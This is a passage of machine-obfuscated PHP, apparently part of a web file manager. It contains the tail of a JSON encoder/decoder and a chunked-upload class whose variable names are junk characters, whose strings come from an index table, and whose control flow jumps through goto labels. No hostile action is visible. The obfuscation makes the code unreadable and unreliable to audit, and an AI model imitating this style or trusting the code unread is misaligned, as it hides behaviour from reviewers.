case $bİ–ñÛ«Æ[1937]: return $bİ–ñÛ«Æ[109]; case $bİ–ñÛ«Æ[312]: return (int) $b“ß¤ßÍ³Õ; case $bİ–ñÛ«Æ[287]: case $bİ–ñÛ«Æ[286]: return (double) $b“ß¤ßÍ³Õ; case $bİ–ñÛ«Æ[321]: $c‚ÜØµğä = $bİ–ñÛ«Æ[43]; $a¶ˆ‰æÆÉƒ = strlen($b“ß¤ßÍ³Õ); for ($Bº¾Ø„¹’‡ = 0; $Bº¾Ø„¹’‡ < $a¶ˆ‰æÆÉƒ; ++$Bº¾Ø„¹’‡) { $aÜ”ƒÊÅ‰³ = ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡]); switch (!0) { case $aÜ”ƒÊÅ‰³ == 8: $c‚ÜØµğä .= $bİ–ñÛ«Æ[1938]; break; case $aÜ”ƒÊÅ‰³ == 9: $c‚ÜØµğä .= $bİ–ñÛ«Æ[1574]; break; case $aÜ”ƒÊÅ‰³ == 10: $c‚ÜØµğä .= $bİ–ñÛ«Æ[1572]; break; case $aÜ”ƒÊÅ‰³ == 12: $c‚ÜØµğä .= $bİ–ñÛ«Æ[1939]; break; case $aÜ”ƒÊÅ‰³ == 13: $c‚ÜØµğä .= $bİ–ñÛ«Æ[1573]; break; case $aÜ”ƒÊÅ‰³ == 34: case $aÜ”ƒÊÅ‰³ == 47: case $aÜ”ƒÊÅ‰³ == 92: $c‚ÜØµğä .= $bİ–ñÛ«Æ[103] . $b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡]; break; case $aÜ”ƒÊÅ‰³ >= 32 && $aÜ”ƒÊÅ‰³ <= 127: $c‚ÜØµğä .= $b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡]; break; case ($aÜ”ƒÊÅ‰³ & 224) == 192: $e Œ„È½°ğ = pack($bİ–ñÛ«Æ[1940], $aÜ”ƒÊÅ‰³, ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 1])); $Bº¾Ø„¹’‡ += 1; $c‰÷ï· Ğñ = $this->utf82utf16($e Œ„È½°ğ); $c‚ÜØµğä .= sprintf($bİ–ñÛ«Æ[1941], bin2hex($c‰÷ï· Ğñ)); break; case ($aÜ”ƒÊÅ‰³ & 240) == 224: $e Œ„È½°ğ = pack($bİ–ñÛ«Æ[1940], $aÜ”ƒÊÅ‰³, ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 1]), ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 2])); $Bº¾Ø„¹’‡ += 2; $c‰÷ï· Ğñ = $this->utf82utf16($e Œ„È½°ğ); $c‚ÜØµğä .= sprintf($bİ–ñÛ«Æ[1941], bin2hex($c‰÷ï· Ğñ)); break; case ($aÜ”ƒÊÅ‰³ & 248) == 240: $e Œ„È½°ğ = pack($bİ–ñÛ«Æ[1940], $aÜ”ƒÊÅ‰³, ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 1]), ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 2]), ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 3])); $Bº¾Ø„¹’‡ += 3; $c‰÷ï· Ğñ = $this->utf82utf16($e Œ„È½°ğ); $c‚ÜØµğä .= sprintf($bİ–ñÛ«Æ[1941], bin2hex($c‰÷ï· Ğñ)); break; case ($aÜ”ƒÊÅ‰³ & 252) == 248: $e Œ„È½°ğ = pack($bİ–ñÛ«Æ[1940], $aÜ”ƒÊÅ‰³, ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 1]), ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 2]), ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 3]), ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 4])); $Bº¾Ø„¹’‡ += 4; $c‰÷ï· Ğñ = $this->utf82utf16($e Œ„È½°ğ); $c‚ÜØµğä .= sprintf($bİ–ñÛ«Æ[1941], bin2hex($c‰÷ï· Ğñ)); break; case ($aÜ”ƒÊÅ‰³ & 254) == 252: $e Œ„È½°ğ = pack($bİ–ñÛ«Æ[1940], $aÜ”ƒÊÅ‰³, ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 1]), ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 2]), ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 3]), ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 4]), ord($b“ß¤ßÍ³Õ[$Bº¾Ø„¹’‡ + 5])); $Bº¾Ø„¹’‡ += 5; $c‰÷ï· Ğñ = $this->utf82utf16($e Œ„È½°ğ); $c‚ÜØµğä .= sprintf($bİ–ñÛ«Æ[1941], bin2hex($c‰÷ï· Ğñ)); break; } } return $bİ–ñÛ«Æ[123] . $c‚ÜØµğä . $bİ–ñÛ«Æ[123]; case $bİ–ñÛ«Æ[1942]: if (is_array($b“ß¤ßÍ³Õ) && count($b“ß¤ßÍ³Õ) && array_keys($b“ß¤ßÍ³Õ) !== range(0, sizeof($b“ß¤ßÍ³Õ) - 1)) { $fØ‹¹ç‡Ğƒ = array_map(array($this, $bİ–ñÛ«Æ[1943]), array_keys($b“ß¤ßÍ³Õ), array_values($b“ß¤ßÍ³Õ)); foreach ($fØ‹¹ç‡Ğƒ as $DŸ¹÷ËÖï©) { if (Services_JSON::isError($DŸ¹÷ËÖï©)) { return $DŸ¹÷ËÖï©; } } return $bİ–ñÛ«Æ[1065] . join($bİ–ñÛ«Æ[57], $fØ‹¹ç‡Ğƒ) . $bİ–ñÛ«Æ[324]; } $eíƒçêµÀˆ = array_map(array($this, $bİ–ñÛ«Æ[1944]), $b“ß¤ßÍ³Õ); foreach ($eíƒçêµÀˆ as $e¨ùë¿ğ™ß) { if (Services_JSON::isError($e¨ùë¿ğ™ß)) { return $e¨ùë¿ğ™ß; } } return $bİ–ñÛ«Æ[167] . join($bİ–ñÛ«Æ[57], $eíƒçêµÀˆ) . $bİ–ñÛ«Æ[484]; case $bİ–ñÛ«Æ[1945]: $EªÎ¸š„¥› = get_object_vars($b“ß¤ßÍ³Õ); $fØ‹¹ç‡Ğƒ = array_map(array($this, $bİ–ñÛ«Æ[1943]), array_keys($EªÎ¸š„¥›), array_values($EªÎ¸š„¥›)); foreach ($fØ‹¹ç‡Ğƒ as $DŸ¹÷ËÖï©) { if (Services_JSON::isError($DŸ¹÷ËÖï©)) { return $DŸ¹÷ËÖï©; } } return $bİ–ñÛ«Æ[1065] . join($bİ–ñÛ«Æ[57], $fØ‹¹ç‡Ğƒ) . $bİ–ñÛ«Æ[324]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $bİ–ñÛ«Æ[109] : new Services_JSON_Error(gettype($b“ß¤ßÍ³Õ) . $bİ–ñÛ«Æ[1946]); } } function name_value($Cèç ‹Äæ¨, $BÏÅí¸ÜŞÅ) { $Båä™í…âê = $this->encode($BÏÅí¸ÜŞÅ); if (Services_JSON::isError($Båä™í…âê)) { return $Båä™í…âê; } return $this->encode(strval($Cèç ‹Äæ¨)) . $_SERVER[©][14] . $Båä™í…âê; } function reduce_string($EŒ¢¿¡£Í§) { $FÅ“™•ø´ =& $_SERVER[©]; $EŒ¢¿¡£Í§ = preg_replace(array($FÅ“™•ø´[1947], $FÅ“™•ø´[1948], $FÅ“™•ø´[1949]), $FÅ“™•ø´[43], $EŒ¢¿¡£Í§); return trim($EŒ¢¿¡£Í§); } function decode($D²Ó”òÒ‘) { $aôæ¤Š®åø =& $_SERVER[©]; $D²Ó”òÒ‘ = $this->reduce_string($D²Ó”òÒ‘); switch (strtolower($D²Ó”òÒ‘)) { case $aôæ¤Š®åø[1597]: return !0; case $aôæ¤Š®åø[1599]: return !1; case $aôæ¤Š®åø[109]: return null; default: $eØš”ò‡Ÿ = array(); if (is_numeric($D²Ó”òÒ‘)) { return (double) $D²Ó”òÒ‘ == (int) $D²Ó”òÒ‘ ? (int) $D²Ó”òÒ‘ : (double) $D²Ó”òÒ‘; } elseif (preg_match($aôæ¤Š®åø[1950], $D²Ó”òÒ‘, $eØš”ò‡Ÿ) && $eØš”ò‡Ÿ[1] == $eØš”ò‡Ÿ[2]) { $f¸¦ùóó‘¦ = substr($D²Ó”òÒ‘, 0, 1); $DÑ©ğºØ = substr($D²Ó”òÒ‘, 1, -1); $Aáˆº´À…œ = $aôæ¤Š®åø[43]; $fñÄ±Ÿ®®® = strlen($DÑ©ğºØ); for ($c«Òßˆó¥  = 0; $c«Òßˆó¥  < $fñÄ±Ÿ®®®; ++$c«Òßˆó¥ ) { $cÁáÉ¯˜–Â = substr($DÑ©ğºØ, $c«Òßˆó¥ , 2); $BÅ·ƒÂÄ¼ = ord($DÑ©ğºØ[$c«Òßˆó¥ ]); switch (!0) { case $cÁáÉ¯˜–Â == $aôæ¤Š®åø[1938]: $Aáˆº´À…œ .= chr(8); ++$c«Òßˆó¥ ; break; case $cÁáÉ¯˜–Â == $aôæ¤Š®åø[1574]: $Aáˆº´À…œ .= chr(9); ++$c«Òßˆó¥ ; break; case $cÁáÉ¯˜–Â == $aôæ¤Š®åø[1572]: $Aáˆº´À…œ .= chr(10); ++$c«Òßˆó¥ ; break; case $cÁáÉ¯˜–Â == $aôæ¤Š®åø[1939]: $Aáˆº´À…œ .= chr(12); ++$c«Òßˆó¥ ; break; case $cÁáÉ¯˜–Â == $aôæ¤Š®åø[1573]: $Aáˆº´À…œ .= chr(13); ++$c«Òßˆó¥ ; break; case $cÁáÉ¯˜–Â == $aôæ¤Š®åø[1352]: case $cÁáÉ¯˜–Â == $aôæ¤Š®åø[1951]: case $cÁáÉ¯˜–Â == $aôæ¤Š®åø[1567]: case $cÁáÉ¯˜–Â == $aôæ¤Š®åø[1569]: if ($f¸¦ùóó‘¦ == $aôæ¤Š®åø[123] && $cÁáÉ¯˜–Â != $aôæ¤Š®åø[1951] || $f¸¦ùóó‘¦ == $aôæ¤Š®åø[65] && $cÁáÉ¯˜–Â != $aôæ¤Š®åø[1352]) { $Aáˆº´À…œ .= $DÑ©ğºØ[++$c«Òßˆó¥ ]; } break; case preg_match($aôæ¤Š®åø[1952], substr($DÑ©ğºØ, $c«Òßˆó¥ , 6)): $DòƒÂğº•® = chr(hexdec(substr($DÑ©ğºØ, $c«Òßˆó¥  + 2, 2))) . chr(hexdec(substr($DÑ©ğºØ, $c«Òßˆó¥  + 4, 2))); $Aáˆº´À…œ .= $this->utf162utf8($DòƒÂğº•®); $c«Òßˆó¥  += 5; break; case $BÅ·ƒÂÄ¼ >= 32 && $BÅ·ƒÂÄ¼ <= 127: $Aáˆº´À…œ .= $DÑ©ğºØ[$c«Òßˆó¥ ]; break; case ($BÅ·ƒÂÄ¼ & 224) == 192: $Aáˆº´À…œ .= substr($DÑ©ğºØ, $c«Òßˆó¥ , 2); ++$c«Òßˆó¥ ; break; case ($BÅ·ƒÂÄ¼ & 240) == 224: $Aáˆº´À…œ .= substr($DÑ©ğºØ, $c«Òßˆó¥ , 3); $c«Òßˆó¥  += 2; break; case ($BÅ·ƒÂÄ¼ & 248) == 240: $Aáˆº´À…œ .= substr($DÑ©ğºØ, $c«Òßˆó¥ , 4); $c«Òßˆó¥  += 3; break; case ($BÅ·ƒÂÄ¼ & 252) == 248: $Aáˆº´À…œ .= substr($DÑ©ğºØ, $c«Òßˆó¥ , 5); $c«Òßˆó¥  += 4; break; case ($BÅ·ƒÂÄ¼ & 254) == 252: $Aáˆº´À…œ .= substr($DÑ©ğºØ, $c«Òßˆó¥ , 6); $c«Òßˆó¥  += 5; break; } } return $Aáˆº´À…œ; } elseif (preg_match($aôæ¤Š®åø[1953], $D²Ó”òÒ‘) || preg_match($aôæ¤Š®åø[1954], $D²Ó”òÒ‘)) { goto aÔ†£…ÄĞ‰; aÔ†£…ÄĞ‰: if ($D²Ó”òÒ‘[0] == $aôæ¤Š®åø[167]) { $Bˆ™‚ˆŒ© = array(SERVICES_JSON_IN_ARR); $AÅÇ¯Û«£ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Bˆ™‚ˆŒ© = array(SERVICES_JSON_IN_OBJ); $Eé¸øé›•´ = array(); } else { $Bˆ™‚ˆŒ© = array(SERVICES_JSON_IN_OBJ); $Eé¸øé›•´ = new stdClass(); } } array_push($Bˆ™‚ˆŒ©, array($aôæ¤Š®åø[1955] => SERVICES_JSON_SLICE, $aôæ¤Š®åø[272] => 0, $aôæ¤Š®åø[1956] => !1)); $DÑ©ğºØ = substr($D²Ó”òÒ‘, 1, -1); goto AË³´†å‘; A“ÌÇ­î‡Ê: for ($c«Òßˆó¥  = 0; $c«Òßˆó¥  <= $fñÄ±Ÿ®®®; ++$c«Òßˆó¥ ) { $A¤Ğ³¬È®¥ = end($Bˆ™‚ˆŒ©); $cÁáÉ¯˜–Â = substr($DÑ©ğºØ, $c«Òßˆó¥ , 2); if ($c«Òßˆó¥  == $fñÄ±Ÿ®®® || $DÑ©ğºØ[$c«Òßˆó¥ ] == $aôæ¤Š®åø[57] && $A¤Ğ³¬È®¥[$aôæ¤Š®åø[1955]] == SERVICES_JSON_SLICE) { $EÅ´íÃ¯„Ö = substr($DÑ©ğºØ, $A¤Ğ³¬È®¥[$aôæ¤Š®åø[272]], $c«Òßˆó¥  - $A¤Ğ³¬È®¥[$aôæ¤Š®åø[272]]); array_push($Bˆ™‚ˆŒ©, array($aôæ¤Š®åø[1955] => SERVICES_JSON_SLICE, $aôæ¤Š®åø[272] => $c«Òßˆó¥  + 1, $aôæ¤Š®åø[1956] => !1)); if (reset($Bˆ™‚ˆŒ©) == SERVICES_JSON_IN_ARR) { array_push($AÅÇ¯Û«£, $this->decode($EÅ´íÃ¯„Ö)); } elseif (reset($Bˆ™‚ˆŒ©) == SERVICES_JSON_IN_OBJ) { $Aµ¯’àéáî = array(); if (preg_match($aôæ¤Š®åø[1957], $EÅ´íÃ¯„Ö, $Aµ¯’àéáî)) { $cãªÈ±áóƒ = $this->decode($Aµ¯’àéáî[1]); $Eããİµİ²… = $this->decode($Aµ¯’àéáî[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Eé¸øé›•´[$cãªÈ±áóƒ] = $Eããİµİ²…; } else { $Eé¸øé›•´->{$cãªÈ±áóƒ} = $Eããİµİ²…; } } elseif (preg_match($aôæ¤Š®åø[1958], $EÅ´íÃ¯„Ö, $Aµ¯’àéáî)) { $cãªÈ±áóƒ = $Aµ¯’àéáî[1]; $Eããİµİ²… = $this->decode($Aµ¯’àéáî[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Eé¸øé›•´[$cãªÈ±áóƒ] = $Eããİµİ²…; } else { $Eé¸øé›•´->{$cãªÈ±áóƒ} = $Eããİµİ²…; } } } } elseif (($DÑ©ğºØ[$c«Òßˆó¥ ] == $aôæ¤Š®åø[123] || $DÑ©ğºØ[$c«Òßˆó¥ ] == $aôæ¤Š®åø[65]) && $A¤Ğ³¬È®¥[$aôæ¤Š®åø[1955]] != SERVICES_JSON_IN_STR) { array_push($Bˆ™‚ˆŒ©, array($aôæ¤Š®åø[1955] => SERVICES_JSON_IN_STR, $aôæ¤Š®åø[272] => $c«Òßˆó¥ , $aôæ¤Š®åø[1956] => $DÑ©ğºØ[$c«Òßˆó¥ ])); } elseif ($DÑ©ğºØ[$c«Òßˆó¥ ] == $A¤Ğ³¬È®¥[$aôæ¤Š®åø[1956]] && $A¤Ğ³¬È®¥[$aôæ¤Š®åø[1955]] == SERVICES_JSON_IN_STR && (strlen(substr($DÑ©ğºØ, 0, $c«Òßˆó¥ )) - strlen(rtrim(substr($DÑ©ğºØ, 0, $c«Òßˆó¥ ), $aôæ¤Š®åø[103]))) % 2 != 1) { array_pop($Bˆ™‚ˆŒ©); } elseif ($DÑ©ğºØ[$c«Òßˆó¥ ] == $aôæ¤Š®åø[167] && in_array($A¤Ğ³¬È®¥[$aôæ¤Š®åø[1955]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Bˆ™‚ˆŒ©, array($aôæ¤Š®åø[1955] => SERVICES_JSON_IN_ARR, $aôæ¤Š®åø[272] => $c«Òßˆó¥ , $aôæ¤Š®åø[1956] => !1)); } elseif ($DÑ©ğºØ[$c«Òßˆó¥ ] == $aôæ¤Š®åø[484] && $A¤Ğ³¬È®¥[$aôæ¤Š®åø[1955]] == SERVICES_JSON_IN_ARR) { array_pop($Bˆ™‚ˆŒ©); } elseif ($DÑ©ğºØ[$c«Òßˆó¥ ] == $aôæ¤Š®åø[1065] && in_array($A¤Ğ³¬È®¥[$aôæ¤Š®åø[1955]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Bˆ™‚ˆŒ©, array($aôæ¤Š®åø[1955] => SERVICES_JSON_IN_OBJ, $aôæ¤Š®åø[272] => $c«Òßˆó¥ , $aôæ¤Š®åø[1956] => !1)); } elseif ($DÑ©ğºØ[$c«Òßˆó¥ ] == $aôæ¤Š®åø[324] && $A¤Ğ³¬È®¥[$aôæ¤Š®åø[1955]] == SERVICES_JSON_IN_OBJ) { array_pop($Bˆ™‚ˆŒ©); } elseif ($cÁáÉ¯˜–Â == $aôæ¤Š®åø[1959] && in_array($A¤Ğ³¬È®¥[$aôæ¤Š®åø[1955]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Bˆ™‚ˆŒ©, array($aôæ¤Š®åø[1955] => SERVICES_JSON_IN_CMT, $aôæ¤Š®åø[272] => $c«Òßˆó¥ , $aôæ¤Š®åø[1956] => !1)); $c«Òßˆó¥ ++; } elseif ($cÁáÉ¯˜–Â == $aôæ¤Š®åø[1960] && $A¤Ğ³¬È®¥[$aôæ¤Š®åø[1955]] == SERVICES_JSON_IN_CMT) { array_pop($Bˆ™‚ˆŒ©); $c«Òßˆó¥ ++; for ($c°©ÃŠ“Ñ = $A¤Ğ³¬È®¥[$aôæ¤Š®åø[272]]; $c°©ÃŠ“Ñ <= $c«Òßˆó¥ ; ++$c°©ÃŠ“Ñ) { $DÑ©ğºØ = substr_replace($DÑ©ğºØ, $aôæ¤Š®åø[60], $c°©ÃŠ“Ñ, 1); } } } if (reset($Bˆ™‚ˆŒ©) == SERVICES_JSON_IN_ARR) { return $AÅÇ¯Û«£; } elseif (reset($Bˆ™‚ˆŒ©) == SERVICES_JSON_IN_OBJ) { return $Eé¸øé›•´; } goto f†‚‡á³ğ; AË³´†å‘: $DÑ©ğºØ = $this->reduce_string($DÑ©ğºØ); if ($DÑ©ğºØ == $aôæ¤Š®åø[43]) { if (reset($Bˆ™‚ˆŒ©) == SERVICES_JSON_IN_ARR) { return $AÅÇ¯Û«£; } else { return $Eé¸øé›•´; } } $fñÄ±Ÿ®®® = strlen($DÑ©ğºØ); goto A“ÌÇ­î‡Ê; f†‚‡á³ğ: } } } function isError($a”©›Ê«¥, $E·Î‰ÔôƒØ = null) { $dÒ–É’É·Â =& $_SERVER[©]; if (class_exists($dÒ–É’É·Â[1961])) { return PEAR::isError($a”©›Ê«¥, $E·Î‰ÔôƒØ); } elseif (is_object($a”©›Ê«¥) && (get_class($a”©›Ê«¥) == $dÒ–É’É·Â[1962] || is_subclass_of($a”©›Ê«¥, $dÒ–É’É·Â[1962]))) { return !0; } return !1; } } if (class_exists($_SERVER[©][1963])) { class Services_JSON_Error extends PEAR_Error { function __construct($c‘ùÒ¿ƒíã = "\165\x6e\153\156\x6f\167\156\40\x65\162\162\x6f\x72", $dÌ‚Ğãë¾ = null, $Fíƒæº÷£ = null, $c–„ÄÄ¹¾ = null, $dÙÅµÏ”´× = null) { parent::PEAR_Error($c‘ùÒ¿ƒíã, $dÌ‚Ğãë¾, $Fíƒæº÷£, $c–„ÄÄ¹¾, $dÙÅµÏ”´×); } } } else { class Services_JSON_Error { function __construct($Cš‚®î‚„ã = "\165\156\x6b\x6e\157\x77\x6e\x20\x65\162\162\x6f\x72", $Eèæ¢ô¨¯÷ = null, $BÙ°Ôè« = null, $aİ¢ƒÖÚ¸¡ = null, $AìÅ›îùöé = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto e–åÌ¥ƒ™©; e–åÌ¥ƒ™©: $b®ÓŸ¥öË­ =& $_SERVER[©]; global $in; $this->in =& $in; goto bÁÅÛóæùÛ; ağ²ËŸ¿†é: $this->checkSize(); $this->tempPathInit(); goto e¨ÄòÜÖØ…; bÁÅÛóæùÛ: if (!empty($_FILES)) { $EÓåÃòøİ = $_FILES[$b®ÓŸ¥öË­[177]]; $this->uploadFile = $EÓåÃòøİ[$b®ÓŸ¥öË­[1964]]; if (!$this->uploadFile && $EÓåÃòøİ[$b®ÓŸ¥öË­[1216]] > 0) { show_json($this->errorInfo($EÓåÃòøİ[$b®ÓŸ¥öË­[1216]]), !1); } } else { if (isset($in[$b®ÓŸ¥öË­[394]])) { $this->uploadFile = isset($in[$b®ÓŸ¥öË­[1965]]) ? $b®ÓŸ¥öË­[1966] : $b®ÓŸ¥öË­[1811]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto ağ²ËŸ¿†é; e¨ÄòÜÖØ…: } public function upload() { goto D¹ñÔùƒ†·; CÁÈî»ìíå: $E¥ ’÷× = $this->tempFile . $eÊ‘»ÊÁ¼[1969] . $eÂÊ°ˆÊ¿Œ; $eèŠˆğÌ = isset($this->in[$eÊ‘»ÊÁ¼[528]]) ? intval($this->in[$eÊ‘»ÊÁ¼[528]]) : 0; $c¾ëÚ†£ã‘ = isset($this->in[$eÊ‘»ÊÁ¼[1970]]) ? intval($this->in[$eÊ‘»ÊÁ¼[1970]]) : 0; goto Aå‚‚òÎÙ; D¹ñÔùƒ†·: $eÊ‘»ÊÁ¼ =& $_SERVER[©]; $eÂÊ°ˆÊ¿Œ = isset($this->in[$eÊ‘»ÊÁ¼[1967]]) ? intval($this->in[$eÊ‘»ÊÁ¼[1967]]) : 0; $BÆ¡×ëâì = isset($this->in[$eÊ‘»ÊÁ¼[1968]]) ? intval($this->in[$eÊ‘»ÊÁ¼[1968]]) : 1; goto CÁÈî»ìíå; Fóñá¼ÃŠÎ: $aŒ ¶¼´–[$eÊ‘»ÊÁ¼[1977]][$eÊ‘»ÊÁ¼[1978] . $eÂÊ°ˆÊ¿Œ] = array($eÊ‘»ÊÁ¼[1979] => $E…«æÕòª, $eÊ‘»ÊÁ¼[1033] => $eÂÊ°ˆÊ¿Œ, $eÊ‘»ÊÁ¼[87] => $eèŠˆğÌ, $eÊ‘»ÊÁ¼[174] => $c¯ÎÎ†àæâ); $this->statusSet($aŒ ¶¼´–); if (count($aŒ ¶¼´–[$eÊ‘»ÊÁ¼[1977]]) != $aŒ ¶¼´–[$eÊ‘»ÊÁ¼[1976]]) { $this->showJson($eÊ‘»ÊÁ¼[1980] . $eÂÊ°ˆÊ¿Œ, !0); } goto CÏ”ß½¿·Ê; F— Õî·: CacheLock::unlock($this->tempFile); return $this->tempFile; goto fïïî¼áç; F¢äïÍ‡à§: $A‡¥Åõ°Æ¡ = $this->moveUploadedFile($E¥ ’÷×); if ($eèŠˆğÌ > 0 && filesize($A‡¥Åõ°Æ¡) == 0) { $this->showJson($eÊ‘»ÊÁ¼[1972], !1); } if (!$A‡¥Åõ°Æ¡) { $this->showJson(LNG($eÊ‘»ÊÁ¼[1973]), !1); } goto Cœ²¤ò‚ÑÃ; CÏ”ß½¿·Ê: ignore_timeout(); if (!$this->checkChunkHash($aŒ ¶¼´–)) { $this->showJson($eÊ‘»ÊÁ¼[1981], !1); } $this->statusSet(!1); goto F— Õî·; Cœ²¤ò‚ÑÃ: $E…«æÕòª = $eÂÊ°ˆÊ¿Œ * $c¾ëÚ†£ã‘; $b£Â½ëÙóî = @fopen($this->tempFile, $eÊ‘»ÊÁ¼[1974]); fseek($b£Â½ëÙóî, $E…«æÕòª); goto f¸›±›µÕ; D”ªÛƒÀ»¶: CacheLock::lock($this->tempFile, 20); $aŒ ¶¼´– = $this->statusGet(); $this->initFileTemp(); goto F¢äïÍ‡à§; C³Âøô¦Ó: @unlink($A‡¥Åõ°Æ¡); if (!$D£ƒ‘ÛÌ¹) { $this->showJson($eÊ‘»ÊÁ¼[1975] . $eÂÊ°ˆÊ¿Œ, !1); } $aŒ ¶¼´–[$eÊ‘»ÊÁ¼[1976]] = $BÆ¡×ëâì; goto Fóñá¼ÃŠÎ; f¸›±›µÕ: $D£ƒ‘ÛÌ¹ = $this->writeTo($A‡¥Åõ°Æ¡, $b£Â½ëÙóî, $this->tempFile); $c¯ÎÎ†àæâ = IO::hashSimple($A‡¥Åõ°Æ¡); $eèŠˆğÌ = IO::size($A‡¥Åõ°Æ¡); goto C³Âøô¦Ó; Aå‚‚òÎÙ: if ($BÆ¡×ëâì > 1 && $c¾ëÚ†£ã‘ <= 0) { show_json($eÊ‘»ÊÁ¼[1971], !1); } if ($c¾ëÚ†£ã‘ > $eèŠˆğÌ) { $BÆ¡×ëâì = 1; } if ($BÆ¡×ëâì <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto D”ªÛƒÀ»¶; fïïî¼áç: } private function checkSize() { $a£ñˆØùÄ =& $_SERVER[©]; if (phpBuild64() || $this->in[$a£ñˆØùÄ[87]] < PHP_INT_MAX) { return; } show_json(LNG($a£ñˆØùÄ[1982]), !1); } private function showJson($a‹Ü¼¤ç, $a…ÀÖ»´¢…) { CacheLock::unlock($this->tempFile); if (!$a…ÀÖ»´¢…) { return show_json($a‹Ü¼¤ç, $a…ÀÖ»´¢…); } show_json($a‹Ü¼¤ç, $a…ÀÖ»´¢…); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto A¸“´·¾ç™; A¸“´·¾ç™: $dÉ‡¾÷§Ò =& $_SERVER[©]; $b „¹’İ¨‡ = TEMP_FILES; @mk_dir($b „¹’İ¨‡); goto DÄƒÖ´ä¢; DÄƒÖ´ä¢: touch($b „¹’İ¨‡ . $dÉ‡¾÷§Ò[1983]); $eîŸÂ¶Üµá = isset($this->in[$dÉ‡¾÷§Ò[1984]]) ? $this->in[$dÉ‡¾÷§Ò[1984]] : !1; if (strlen($eîŸÂ¶Üµá) < 30) { $eîŸÂ¶Üµá = md5(USER_ID . $this->in[$dÉ‡¾÷§Ò[85]] . $this->fileName . $this->in[$dÉ‡¾÷§Ò[87]]); } goto D÷¢›ó×; D÷¢›ó×: $this->tempFile = $b „¹’İ¨‡ . $dÉ‡¾÷§Ò[1985] . md5($eîŸÂ¶Üµá . $this->in[$dÉ‡¾÷§Ò[1529]]); goto BöÁÁô¥§‚; BöÁÁô¥§‚: } private function moveUploadedFile($b‡Ğ„¨µÛº) { $EÆ²Ş½¡¿è =& $_SERVER[©]; $Dã“§äçèÇ = $this->uploadFile; if ($Dã“§äçèÇ == $EÆ²Ş½¡¿è[1986]) { @file_put_contents($b‡Ğ„¨µÛº, base64_decode($_REQUEST[$EÆ²Ş½¡¿è[1987]])); } else { if ($Dã“§äçèÇ == $EÆ²Ş½¡¿è[1811]) { $BóÉ¸ƒ°ñ = @fopen($b‡Ğ„¨µÛº, $EÆ²Ş½¡¿è[1519]); $this->writeTo($Dã“§äçèÇ, $BóÉ¸ƒ°ñ, $b‡Ğ„¨µÛº); } else { if (!move_uploaded_file($Dã“§äçèÇ, $b‡Ğ„¨µÛº)) { return !1; } } } return $b‡Ğ„¨µÛº; } private function writeTo($c÷õÛ©•ô, $bï¦…ÊÇÑ…, $D—–È« ĞÎ) { goto bì×£ã®ˆÀ; dÑ…®ÄŒ„†: $aÒËÔßÕå… = @fopen($c÷õÛ©•ô, $E†õÑƒ‘ƒï[1518]); if (!$aÒËÔßÕå… || !$bï¦…ÊÇÑ… || !$DƒÈ†¾¶) { CacheLock::unlock($B«Ößàƒ‹×); return !1; } while (!feof($aÒËÔßÕå…)) { fwrite($bï¦…ÊÇÑ…, fread($aÒËÔßÕå…, 1024 * 200)); } goto eêÀŒö‹›‹; bì×£ã®ˆÀ: $E†õÑƒ‘ƒï =& $_SERVER[©]; $B«Ößàƒ‹× = $E†õÑƒ‘ƒï[1988] . $D—–È« ĞÎ; $DƒÈ†¾¶ = CacheLock::lock($B«Ößàƒ‹×, 1); goto dÑ…®ÄŒ„†; eêÀŒö‹›‹: fclose($aÒËÔßÕå…); fclose($bï¦…ÊÇÑ…); CacheLock::unlock($B«Ößàƒ‹×); goto c¡‚´‘—Š; c¡‚´‘—Š: return !0; goto C÷³§‹’Ï; C÷³§‹’Ï: } private function statusGet() { goto AÁ”îØ‘†; AÁ”îØ‘†: $aç›¹á¶Éæ =& $_SERVER[©]; if (is_array($this->statusData)) { return $this->statusData; } $CÔŒ¯Œ°«Á = $this->tempFile . $aç›¹á¶Éæ[1989]; goto b²×áñ·ì; b²×áñ·ì: $a›Úİ’ğõ• = !1; if (file_exists($CÔŒ¯Œ°«Á)) { $a›Úİ’ğõ• = @file_get_contents($CÔŒ¯Œ°«Á); } if ($a›Úİ’ğõ•) { $this->statusData = json_decode($a›Úİ’ğõ•, !0); } goto d°ˆÓËÙ¾; d°ˆÓËÙ¾: if (!$this->statusData) { $c£ÛÚù·ø = array($aç›¹á¶Éæ[38] => $this->fileName, $aç›¹á¶Éæ[1976] => 0, $aç›¹á¶Éæ[1977] => array()); $this->statusSet($c£ÛÚù·ø); } return $this->statusData; goto C½ß¢‡İµË; C½ß¢‡İµË: } public function statusSet($Fã½‹¥‘¿) { 